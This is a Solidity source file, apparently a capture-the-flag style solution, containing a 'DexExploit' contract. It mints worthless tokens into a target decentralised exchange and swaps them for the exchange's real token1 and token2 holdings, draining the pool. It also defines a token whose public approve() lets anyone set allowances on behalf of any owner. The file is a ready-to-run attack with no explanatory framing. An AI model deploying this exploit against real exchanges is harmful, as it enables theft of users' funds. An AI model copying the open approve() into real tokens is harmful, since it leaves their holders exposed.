// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

interface Dex {
  
  function setTokens(address _token1, address _token2) external;  
  function swap(address from, address to, uint amount) external;
  function getSwapPrice(address from, address to, uint amount) external view returns(uint);
  function approve(address spender, uint amount) external;
  function balanceOf(address token, address account) external view returns (uint);
  function token1() external view returns (address);
  function token2() external view returns (address);
}

contract SwappableTokenTwo is ERC20 {
  constructor(address dexInstance, string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(dexInstance, 100); //Just directly mint the tokens to the addresses
        _mint(msg.sender, 100); 
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    super._approve(owner, spender, amount);
  }
}

contract DexExploit{

  Dex targetContract;
  address targetAddress;
  address tokenOne;
  address tokenTwo;

  SwappableTokenTwo fakeToken;
  SwappableTokenTwo fakeTokenTwo;
  
  constructor(address _address){
      targetAddress = _address;
      targetContract = Dex(_address);
      tokenOne= targetContract.token1();
      tokenTwo= targetContract.token2();

      fakeToken = new SwappableTokenTwo(targetAddress, "Token 1", "TKN1");
      fakeTokenTwo = new SwappableTokenTwo(targetAddress, "Token 2", "TKN2");
  }

  function pwn() public {
      fakeToken.approve(address(this), targetAddress, 100);
      targetContract.swap(address(fakeToken), tokenOne, 100);

      fakeTokenTwo.approve(address(this), targetAddress, 100);
      targetContract.swap(address(fakeTokenTwo), tokenTwo, 100);
  }
}